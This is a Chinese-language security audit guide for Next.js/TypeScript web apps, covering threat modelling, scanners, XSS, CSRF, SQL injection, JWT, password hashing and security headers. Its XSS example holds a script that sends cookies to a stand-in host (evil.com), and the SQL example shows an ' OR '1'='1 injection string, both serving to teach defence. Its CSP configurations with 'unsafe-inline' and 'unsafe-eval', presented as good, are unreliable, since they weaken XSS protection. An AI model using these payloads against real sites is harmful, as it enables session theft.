# Security Audit Skill

## 适用场景

当你需要进行安全审查、修复安全漏洞或实施安全措施时。

## 安全审计流程

### Step 1: 资产识别

- [ ] 列出所有 API 端点
- [ ] 识别敏感数据（PII、密码、token）
- [ ] 确定认证授权机制
- [ ] 梳理第三方依赖

### Step 2: 威胁建模

使用 STRIDE 模型分析：
- **S**poofing (伪装): 身份伪造
- **T**ampering (篡改): 数据修改
- **R**epudiation (抵赖): 操作否认
- **I**nformation Disclosure (信息泄露)
- **D**enial of Service (拒绝服务)
- **E**levation of Privilege (权限提升)

### Step 3: 漏洞扫描

```bash

# 依赖漏洞扫描

npm audit
pnpm audit

# 自动化安全扫描

npm install -g snyk
snyk test

# OWASP ZAP 扫描

docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000

```

### Step 4: 手动审查

- 代码审查关键路径
- 渗透测试关键功能
- 配置审查

## 常见安全漏洞及防护

### 1. XSS (跨站脚本攻击)

#### 攻击示例

```javascript

// 攻击者注入恶意脚本
const userInput = '<script>document.location="http://evil.com/?cookie="+document.cookie</script>';

```

#### 防护措施

```typescript

// ✅ Good: React 自动转义
<div>{userInput}</div> // 安全，React 会自动转义

// ❌ Bad: 危险地设置 HTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ Good: 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} />

// ✅ Good: 设置 Content-Security-Policy
// next.config.mjs
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-inline';"
  }
];

```

### 2. CSRF (跨站请求伪造)

#### 防护措施

```typescript

// ✅ Good: 使用 CSRF token
import { cookies } from 'next/headers';

export async function POST(req: Request) {
  const csrfToken = req.headers.get('x-csrf-token');
  const storedToken = cookies().get('csrf-token')?.value;

  if (csrfToken !== storedToken) {
    return Response.json({ error: 'Invalid CSRF token' }, { status: 403 });
  }

  // 处理请求
}

// ✅ Good: SameSite Cookie
Set-Cookie: session=xyz; SameSite=Strict; HttpOnly; Secure

```

### 3. SQL 注入

#### 攻击示例

```sql

-- 攻击者输入: ' OR '1'='1
SELECT * FROM users WHERE email = '' OR '1'='1'

```

#### 防护措施

```typescript

// ❌ Bad: 字符串拼接（危险！）
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ Good: 使用参数化查询（Prisma 自动处理）
const user = await prisma.user.findUnique({
  where: { email }
});

// ✅ Good: 使用 ORM
// Prisma, Drizzle, TypeORM 等都防止 SQL 注入

```

### 4. 认证安全

#### JWT Token 最佳实践

```typescript

// ✅ Good: 安全的 JWT 配置
import jwt from 'jsonwebtoken';

const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET!,
  {
    expiresIn: '1h', // 短期过期
    issuer: 'your-app',
    audience: 'your-app-users'
  }
);

// ✅ Good: Token 刷新机制
async function refreshToken(oldToken: string) {
  try {
    const decoded = jwt.verify(oldToken, process.env.JWT_REFRESH_SECRET!);

    // 检查 token 是否在黑名单中
    if (await isTokenBlacklisted(oldToken)) {
      throw new Error('Token revoked');
    }

    // 颁发新 token
    return generateNewToken(decoded.userId);
  } catch (error) {
    throw new Error('Invalid refresh token');
  }
}

// ✅ Good: Token 黑名单（登出时）
const blacklistedTokens = new Set<string>();

async function logout(token: string) {
  blacklistedTokens.add(token);
  // 或使用 Redis 存储，设置 TTL
}

```

#### 密码安全

```typescript

import bcrypt from 'bcrypt';

// ✅ Good: 密码哈希
const saltRounds = 12;
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);

// ✅ Good: 密码验证
const isValid = await bcrypt.compare(inputPassword, hashedPassword);

// ❌ Bad: 明文存储密码（永远不要这样做！）

```

### 5. 速率限制

```typescript

// ✅ Good: API 速率限制
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'), // 10 次/10秒
  analytics: true,
});

export async function POST(req: Request) {
  const ip = req.headers.get('x-forwarded-for') || 'unknown';

  const { success } = await ratelimit.limit(ip);

  if (!success) {
    return Response.json(
      { error: 'Too many requests' },
      { status: 429 }
    );
  }

  // 处理请求
}

```

### 6. 输入验证

```typescript

import { z } from 'zod';

// ✅ Good: 严格的输入验证
const createUserSchema = z.object({
  email: z.string().email().max(255),
  password: z.string()
    .min(8, 'Password must be at least 8 characters')
    .regex(/[A-Z]/, 'Must contain uppercase')
    .regex(/[a-z]/, 'Must contain lowercase')
    .regex(/[0-9]/, 'Must contain number'),
  name: z.string().min(1).max(100),
  age: z.number().min(0).max(150),
});

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const validated = createUserSchema.parse(body);

    // 使用验证后的数据
    await createUser(validated);
  } catch (error) {
    if (error instanceof z.ZodError) {
      return Response.json(
        { error: 'Validation failed', details: error.errors },
        { status: 400 }
      );
    }
  }
}

```

### 7. 文件上传安全

```typescript

// ✅ Good: 安全的文件上传
import { writeFile } from 'fs/promises';
import path from 'path';
import crypto from 'crypto';

const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
const MAX_SIZE = 5 * 1024 * 1024; // 5MB

export async function POST(req: Request) {
  const formData = await req.formData();
  const file = formData.get('file') as File;

  // 验证文件类型
  if (!ALLOWED_TYPES.includes(file.type)) {
    return Response.json(
      { error: 'Invalid file type' },
      { status: 400 }
    );
  }

  // 验证文件大小
  if (file.size > MAX_SIZE) {
    return Response.json(
      { error: 'File too large' },
      { status: 400 }
    );
  }

  // 生成安全的文件名
  const ext = path.extname(file.name);
  const safeName = `${crypto.randomBytes(16).toString('hex')}${ext}`;

  // 保存到安全目录（不在 web root）
  const uploadDir = process.env.UPLOAD_DIR || '/uploads';
  const filePath = path.join(uploadDir, safeName);

  const buffer = Buffer.from(await file.arrayBuffer());
  await writeFile(filePath, buffer);

  return Response.json({ url: `/uploads/${safeName}` });
}

```

## 安全头配置

### Next.js 安全头

```typescript

// next.config.mjs
const securityHeaders = [
  {
    key: 'X-DNS-Prefetch-Control',
    value: 'on'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=63072000; includeSubDomains; preload'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'Referrer-Policy',
    value: 'origin-when-cross-origin'
  },
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};

```

## 环境变量安全

```bash

# .env.local (不要提交到 Git)

DATABASE_URL=postgresql://user:password@localhost:5432/db
JWT_SECRET=your-super-secret-key-here
API_KEY=sk-xxxxxxxxxxxxx

# .env.example (可以提交)

DATABASE_URL=postgresql://user:password@localhost:5432/db
JWT_SECRET=change-me
API_KEY=your-api-key

```

```gitignore

# .gitignore

.env
.env.local
.env.production
!.env.example

```

## 依赖安全管理

### 定期更新依赖

```bash

# 检查过时依赖

npm outdated
pnpm outdated

# 更新依赖

npm update
pnpm update

# 审计漏洞

npm audit
pnpm audit fix

# 自动化：使用 Dependabot 或 Renovate

```

### GitHub Dependabot 配置

```yaml

# .github/dependabot.yml

version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

```

## 安全检查清单

### 开发阶段

- [ ] 启用 TypeScript 严格模式
- [ ] 使用 ESLint 安全插件
- [ ] 输入验证和清理
- [ ] 参数化查询（防 SQL 注入）
- [ ] 输出转义（防 XSS）
- [ ] CSRF 保护
- [ ] 安全的会话管理

### 上线前

- [ ] 运行 npm audit
- [ ] 移除调试代码和 console.log
- [ ] 配置安全头
- [ ] 启用 HTTPS
- [ ] 设置 CORS 策略
- [ ] 配置速率限制
- [ ] 审查环境变量
- [ ] 禁用详细错误信息

### 生产环境

- [ ] 监控异常和错误
- [ ] 定期更新依赖
- [ ] 备份数据库
- [ ] 日志脱敏
- [ ] 访问控制审查
- [ ] 定期安全审计
- [ ] 应急响应计划

## 安全工具推荐

### 静态分析

- **ESLint**: eslint-plugin-security
- **SonarQube**: 代码质量和安全
- **Semgrep**: 自定义安全规则

### 动态分析

- **OWASP ZAP**: Web 应用扫描
- **Burp Suite**: 渗透测试
- **Nmap**: 网络扫描

### 依赖扫描

- **npm audit**: 内置审计
- **Snyk**: 依赖和容器扫描
- **Dependabot**: 自动更新

### 运行时保护

- **Helmet**: Express 安全头
- **CORS**: 跨域资源共享
- **Rate Limiter**: 速率限制

## 应急响应流程

### 发现安全漏洞

1. **立即响应**
   - 评估影响范围
   - 隔离受影响系统
   - 通知安全团队

2. **修复漏洞**
   - 开发补丁
   - 测试修复方案
   - 紧急部署

3. **事后分析**
   - 撰写事故报告
   - 根本原因分析
   - 制定预防措施
   - 更新安全策略

### 漏洞披露

```markdown

## 安全联系

如发现安全漏洞，请邮件至: security@example.com

我们承诺:
- 24 小时内确认收到
- 72 小时内提供初步评估
- 修复后公开致谢

```
